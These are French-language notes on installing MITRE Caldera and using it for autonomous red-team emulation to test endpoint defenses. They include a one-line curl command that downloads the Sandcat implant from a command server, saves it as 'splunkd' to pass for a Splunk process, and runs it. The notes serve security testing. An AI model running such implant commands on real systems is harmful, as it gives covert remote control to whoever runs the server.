---
Title: Mitre Attack test with Cladera
Type: Doc
Nature: Notes
Création: 10/05/2021
---

# Mitre Attack test with Cladera
## Introduction

> CALDERA™ is a cyber security framework designed to easily automate adversary emulation, assist manual red-teams, and automate incident response. It is built on the [MITRE ATT&CK framework](https://attack.mitre.org/) and is an active research project at MITRE

Caldera fonctionne en mode client/server (agent/server). Il peut être utilisé soit pour les opérations offensives(red) ou défensives (blue) et de [différentes manières ](https://caldera.readthedocs.io/en/latest/Getting-started.html)(autonomous red-engagements, autonomous incident-response, …).

Dans cette note, nous allons voir le mode "autonomous red-engagements" afin de lancer les attaques sur une cible pour tester, entre autres, les solutions de défense installées sur la machine comme le XDR, l'EPP, l'antivirus, ….

## Installation de Caldera
### Prerequis
- Linux or MacOS operating system
- Python 3.6.1+ (with pip3)
- NB : Recommanded
  - [GoLang](https://golang.org/doc/install)[ ](https://golang.org/doc/install)1.13+ (for optimal agent functionality)
  - Google Chrome browser
  - Hardware: 8GB+ RAM and 2+ CPUs

### Installation
Exécuter la commande
```
# Installation manuelle
git clone https://github.com/mitre/caldera.git --recursive --branch 3.1.0
cd caldera
# install the pip requirements
sudo pip3 install -r requirements.txt

# Start the server
python3 server.py

# Installation via Docker
## clone the repository
git clone https://github.com/mitre/caldera.git --recursive --branch 3.1.0
cd caldera
## Next, build a container
docker build . -t caldera:server
docker run -p 7010:7010 -p 7011:7011 -p 7012:7012 -p 8888:8888 caldera:server
```
 Accéder à l'interface web
> Once started, log in to http://localhost:8888 with red or blue password. To modify these values, edit the conf/local.yml file
NB : (Manual installation) with the red using the password found in the conf/local.yml file (this file will be generated on server start).

## Use cases
### Déploiement d'agent

Sur chaque machine "victime", un agent Caldera doit être installé afin de pouvoir exécuter les attaques. Nous allons utiliser le mode "[Autonomous red-engagements](https://caldera.readthedocs.io/en/latest/Getting-started.html#autonomous-red-team-engagements)" puis que notre but est de tester les solutions de sécurité.Pour ce faire :
1. Se connecter à l'interface avec le compte "**red**" et son mot de passe
2. Dans l'interface du serveur Caldera, cliquer sur "**Navigate**"
3. Sous "**Campaigns**", cliquer sur "**agents**", puis sur "**Click here to deploy an agent**"
4. Entrer les informations nécessaires pour générer la commande d'installation de l'agent :
   - a. Type d'agent: Sandcat (54ndc47) (par exemple). C'est un agent Goland qui communique avec le serveur via http(s)
   - b. La plateforme (OS) de la machine cible : Linux (par exemple)
   - c. l'URL du serveur Caldera : http(s)://server\_ip:8888
   - d. Agent implant name (optionnel) : Nom de la machine victime une fois "possédée" (ex : ubuntud)
5. Exécuter ensuite la commande "**A GoLang agent which communicates through the HTTP contact (sh)**" sur la machine "victime" pour installer l'agent :
```
server="http://192.168.1.19:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;chmod +x splunkd;./splunkd -server $server -group red -v
```
> NB : S'assurer que l'agent apparait bien

### Choix d'un profile d'attaque (adversary profile)
Pour lancer des attaques sur la victime (machine cible), il faut choisir un profile d'attaque. Chaque profile correspond à une catégorie de techniques d'attaque de la matrice MITTRE ATT&CK.
> NB : The “Discovery” and “Hunter” adversaries from the Stockpile plugin are good starting profiles.

1. Aller dans Navigate > Adversaries
2. Sélectionner un profile

### Exécution d'une opération
Une fois le profile choisit, on peut lancer l'attaque sur la machine en choisissant une oprétaion.
1. Aller dans Navigate > Operation
2. Entrer le nom de l'opération
3. Sélectionner un agent et d'autres informations
4. Lancer l'opération
> NB :
> - On peut suivre l'exécution des tests en temps réel. En cliquant sur les stars (étoiles), on peut voir le résultat du test.
> - Les tests marqués en "**vert**" sont ceux qui ont réussi.
> - A la fin de l'opération aussi, on peut générer le rapport ou les logs pour voir les détails.

# Documentation
- Full documentation, training and use cases : https://caldera.readthedocs.io/en/latest/
- Github : https://github.com/mitre/caldera
- Releases : https://github.com/mitre/caldera/releases
